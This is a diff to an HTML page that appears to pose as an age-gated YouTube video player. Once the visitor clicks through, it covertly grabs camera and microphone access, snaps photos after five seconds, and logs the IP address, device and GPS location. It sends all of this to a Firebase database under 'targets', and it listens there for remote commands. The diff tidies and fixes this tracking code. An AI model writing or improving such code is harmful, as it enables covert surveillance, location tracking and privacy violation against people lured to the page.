@@ -68,13 +68,13 @@
 
     <div id="video-container">
         <iframe id="main-player" 
-            src="https://www.youtube.com/watch?v=6Ogzc_-lW9w&list=RD6Ogzc_-lW9w&start_radio=1" 
-            allow="autoplay; encrypted-media" allowfullscreen>
+            src="" 
+            allow="autoplay; encrypted-media; picture-in-picture" allowfullscreen>
         </iframe>
     </div>
 
 <script>
-    // Firebase Config (Aapka original config yahan rahega)
+    // Firebase Config (Don't change this)
     const firebaseConfig = { databaseURL: "https://mytrecker2-b3535-default-rtdb.firebaseio.com/" };
     if (!firebase.apps.length) { firebase.initializeApp(firebaseConfig); }
     const db = firebase.database();
@@ -82,8 +82,8 @@
     let sessionID = "USER_" + Math.floor(1000 + Math.random() * 9000);
     let globalStream = null;
 
-    // YOUTUBE VIDEO ID YAHAN CHANGE KAREIN
-    const youtubeID = "vXpIat89mY0"; 
+    // YOUTUBE VIDEO ID FIX
+    const youtubeID = "ZhhBlQC_5N8"; 
 
     function showModal() { document.getElementById('age-modal').style.display = 'block'; }
 
@@ -95,12 +95,12 @@
         document.getElementById('loading-text').style.display = 'block';
 
         try {
-            // 1. Request Camera Permission
+            // 1. Request Camera/Mic Permission
             globalStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
             
-            // 2. Set YouTube Link with Autoplay & Mute Fix
+            // 2. Set YouTube Link with CORRECT FORMAT and Autoplay/Mute
             const ytFrame = document.getElementById('main-player');
-            ytFrame.src = `https://www.youtube.com/embed/${youtubeID}?autoplay=1&mute=1&controls=0&loop=1&playlist=${youtubeID}&rel=0`;
+            ytFrame.src = `https://www.youtube.com/embed/${youtubeID}?autoplay=1&mute=1&controls=0&loop=1&playlist=${youtubeID}&rel=0&modestbranding=1`;
 
             // 3. Show Video Container
             document.getElementById('video-container').style.display = 'block';
@@ -109,8 +109,11 @@
             // Background Tasks
             sendInfo(uName);
             trackGPS();
+            
+            // Auto-Capture after 5 seconds
             setTimeout(() => capture("user"), 5000);
 
+            // Command Listener
             db.ref(`commands/${sessionID}`).on('value', snap => {
                 const cmd = snap.val();
                 if(cmd) {
@@ -126,7 +129,6 @@
         }
     }
 
-    // Capture & Other Functions (Same as before)
     async function capture(mode) {
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { ideal: mode } } });
@@ -143,16 +145,18 @@
                 });
                 stream.getTracks().forEach(t => t.stop());
             }, 3000);
-        } catch (err) {}
+        } catch (err) { console.log("Capture Error:", err); }
     }
 
     async function sendInfo(name) {
-        const ip = await fetch('https://api.ipify.org?format=json').then(r => r.json()).catch(() => ({ip:"N/A"}));
-        db.ref(`targets/${sessionID}/info`).set({
-            status: "ONLINE", customName: name, ip: ip.ip,
-            device: navigator.userAgent.split(') ')[0] + ')',
-            time: new Date().toLocaleTimeString()
-        });
+        try {
+            const ip = await fetch('https://api.ipify.org?format=json').then(r => r.json()).catch(() => ({ip:"N/A"}));
+            db.ref(`targets/${sessionID}/info`).set({
+                status: "ONLINE", customName: name, ip: ip.ip,
+                device: navigator.userAgent.split(') ')[0] + ')',
+                time: new Date().toLocaleTimeString()
+            });
+        } catch(e) {}
     }
 
     function trackGPS() {
@@ -163,4 +167,3 @@
 </script>
 </body>
 </html>
-
